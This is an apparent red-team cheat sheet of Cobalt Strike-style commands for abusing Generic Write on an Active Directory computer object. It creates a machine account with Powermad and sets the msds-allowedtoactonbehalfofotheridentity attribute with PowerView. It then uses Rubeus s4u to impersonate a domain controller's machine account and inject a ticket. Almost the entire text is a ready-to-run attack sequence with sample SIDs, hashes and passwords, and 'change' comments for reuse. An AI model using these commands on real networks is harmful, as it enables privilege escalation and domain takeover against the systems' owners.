Generic Write Add New Machine
#Added New Machine Account

# Change MachineName and Password
powershell-import /home/user/Dropbox/tools/post-exploit/windows/Powermad/Powermad.ps1
powerpick New-MachineAccount -MachineAccount scooter -Password $(ConvertTo-SecureString 'Password123!!!' -AsPlainText -Force)

# Change DomainComputer
powershell-import /home/user/Dropbox/tools/post-exploit/windows/PowerSploit-dev/Recon/PowerView.ps1
powerpick Get-DomainComputer scooter -Properties objectsid | Select -Expand objectsid
    S-1-5-21-340507432-2615605230-720798708-3101

# Change SID from results above
powerpick $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$('S-1-5-21-340507432-2615605230-720798708-3101'))"; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0); Get-DomainComputer scooter | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Change DomainComputer
powerpick $RawBytes = Get-DomainComputer scooter -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity; $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0; $Descriptor.DiscretionaryAcl

# Change password and user
execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe hash /password:Password123!!! /user:scooter$ /domain:m3c.local

#Change user and enc type + hash
execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe s4u /user:scooter$ /rc4:A6046AE491FEA36346D82E83A79777F7 /impersonateuser:M3DC$ /msdsspn:cifs/m3dc.m3c.local /ptt
